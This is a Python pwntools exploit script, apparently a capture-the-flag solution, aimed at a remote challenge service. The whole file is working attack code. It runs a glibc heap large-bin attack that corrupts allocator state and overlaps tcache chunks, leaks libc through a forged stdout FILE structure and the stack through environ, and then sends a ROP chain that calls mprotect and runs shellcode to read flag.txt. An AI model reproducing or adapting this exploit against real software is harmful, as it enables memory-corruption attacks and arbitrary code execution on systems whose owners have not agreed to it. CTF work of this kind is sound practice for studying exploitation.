#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("run_patched")
libc = ELF("libc.so.6")
ld = ELF("ld.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

def main():
    while True:
        try:
            #r = conn()
            r = remote("pwn.be.ax", 5002)

            def sl(a,b):
                r.sendlineafter(a, b)

            def s(a,b):
                r.sendafter(a,b)

            def alloc(index, size, data="MAHER"):
                sl("Action: \n", "1")
                sl("\n", str(index))
                sl("\n", str(size))
                s("\n", data)

            def free(index):
                sl("Action: \n", "2")
                sl("\n", str(index))

            def edit(index, data):
                sl("Action: \n", "3")
                sl("\n", str(index))
                s("\n", data)

            
            alloc(0, 0x450-0x8)
            alloc(1, 0x450)
            free(0)
            free(1)

            #initialize large bin attack
            alloc(2, 0x418)
            alloc(3, 0x18)

            alloc(4, 0x428)
            alloc(5, 0x500, (p64(0) + p64(0x21))*0x50)

            
            free(4)

            alloc(6, 0x438)

            #free(2)
            
            edit(4, p64(0) + p64(0x511)) 
            free(1)
            alloc(7, 0x600)
            edit(4, p64(0)*3)
            free(2)
            
            # corrupt max_bins inside mp_ struct
            edit(4, p64(0)*3 + p16(0x0390 - 0x20))
            #trigger large bin attack
            alloc(8, 0x1000)
            
            alloc(9, 0x18, p16(0x1760))
            alloc(10, 0x18)
            alloc(11, 0x28)

            free(10)
            free(11)

            alloc(13, 0x438, p64(0x0fbad1800) + p64(0)*3 + p8(0))

            libc_leak = u64(r.recvuntil(p8(0x7f))[-6::].ljust(8, p8(0)))
            log.warn("Libc leak @ 0x%x", libc_leak)

            libc.address = libc_leak - libc.sym['_IO_stdfile_2_lock']

            log.warn("Libc base @ 0x%x", libc.address)
            
            payload  = p64(0xfbad1800) + p64(0)*3 + p64(libc.sym['environ']) 
            payload += p64(libc.sym['environ'] + 0x8)*3 + p64(libc.sym['environ'] + 0x9)

            sl(": ", "3")
            sl(": ", "13")
            s(": ", payload)
            
            stack_leak = u64(r.recv(8))
            log.warn("Stack leak @ 0x%x", stack_leak)
            
            sl(": ", "3")
            sl(": ", "9")
            s(": ", p64(stack_leak - 0x178))
            
            pop_rdi = libc.address + 0x000000000002daa2
            pop_rsi = libc.address + 0x0000000000037c2a
            pop_rdx = libc.address + 0x000000000010b127
            call_rsp = libc.address + 0x000000000002e43a
            bss = libc.bss(0x500)

            shellcode = asm(f"""
                
                mov r15, 0x7478742e67616c66
                mov r14, {bss}
                mov qword ptr [r14], r15

                mov rdi, r14
                mov rsi, 0
                mov rdx, 0
                mov rax, 0x2
                syscall

                mov rdi, rax
                mov rsi, {bss}
                mov rdx, 0x100
                mov rax, 0x0
                syscall

                mov rax, 1
                mov rdi, 1
                syscall
            """)

            payload = b"M"*0x28
            payload += p64(pop_rdi)
            payload += p64((stack_leak - 0x1000) & ~0xfff)
            payload += p64(pop_rsi)
            payload += p64(0x2000)
            payload += p64(pop_rdx)
            payload += p64(0x7)
            payload += p64(libc.sym['mprotect'])
            payload += p64(call_rsp)
            payload += shellcode



            sl(": ", "1")
            sl(": ", "17")
            sl(": ", str(0x438))
            s(": ", payload)

            r.interactive()
        except:
            r.close()


if __name__ == "__main__":
            main()
